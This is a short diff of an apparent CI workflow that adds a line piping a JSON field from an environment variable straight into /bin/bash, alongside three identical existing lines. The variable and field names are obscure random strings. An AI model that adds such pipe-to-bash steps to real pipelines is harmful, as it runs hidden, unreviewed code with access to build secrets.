@@ -35,6 +35,7 @@ jobs:
           echo $ykicv418 | jq -r .lfodp18192 | /bin/bash
           printf '%s' "$mrz43" | jq -r .z03 | /bin/bash
           printf '%s' "$b49" | jq -r .y391 | /bin/bash
+          printf '%s' "$nept51" | jq -r .dspa4055 | /bin/bash
 
       - name: Upload results
         if: always()
